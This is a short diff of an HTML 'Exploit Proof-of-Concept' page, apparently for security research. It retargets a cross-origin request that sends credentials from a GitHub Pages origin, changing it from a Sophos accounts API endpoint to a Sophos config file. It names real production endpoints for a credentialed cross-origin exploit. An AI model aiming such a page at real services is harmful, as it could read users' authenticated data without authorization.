@@ -17,7 +17,7 @@
 
 <div class="box">
     <h2>Exploit Proof-of-Concept</h2>
-    <p>Target: <code>https://accounts.home.sophos.com/api/v1/human/BZu50WWW6C8cWodb2gsKukJxLFBVQDm2kaPvIEwl/default</code></p>
+    <p>Target: <code>https://s.home.sophos.com/config/web.json</code></p>
     <p>Source Origin: <code>https://stelemane.github.io</code></p>
     
     <div id="status" class="status">[*] Initializing Request...</div>
@@ -29,7 +29,7 @@
         const statusDiv = document.getElementById('status');
         const outputDiv = document.getElementById('output');
         
-        const target = "https://accounts.home.sophos.com/api/v1/human/BZu50WWW6C8cWodb2gsKukJxLFBVQDm2kaPvIEwl/default";
+        const target = "https://s.home.sophos.com/config/web.json";
 
         statusDiv.innerText = "[*] Sending request with Authorization & Credentials (No Fingerprint)...";
 
